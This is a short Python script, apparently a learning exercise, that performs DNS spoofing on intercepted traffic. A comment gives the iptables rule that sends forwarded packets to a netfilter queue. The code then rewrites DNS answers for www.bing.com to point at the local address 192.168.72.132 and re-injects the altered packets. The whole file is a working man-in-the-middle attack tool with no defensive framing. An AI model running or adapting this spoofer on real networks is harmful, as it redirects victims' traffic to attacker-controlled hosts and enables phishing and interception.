#from netfilterqueue import NetfilterQueue 
import netfilterqueue
import scapy.all as scapy 


#sudo iptables -I FORWARD -j NFQUEUE --queue-num 0 ---> to enable queue for packet 

def process_packet(packet):
    scapy_packet = (scapy.IP(packet.get_payload()))
    if scapy_packet.haslayer(scapy.DNSRR): #Looking for DNS responses
        qname = (scapy_packet[scapy.DNSQR].qname) #Stores Question request in variable 
        if 'www.bing.com' in str(qname):
            print("[*] Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.72.132") #Spoofing IP in response packet
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1 
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum   #Removes checksums and lengths so scapy can automatically recalculate
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) #Connects to Que we created by giving it the number of the Queue we made. #Also calls function on packet in the Queue 
queue.run()
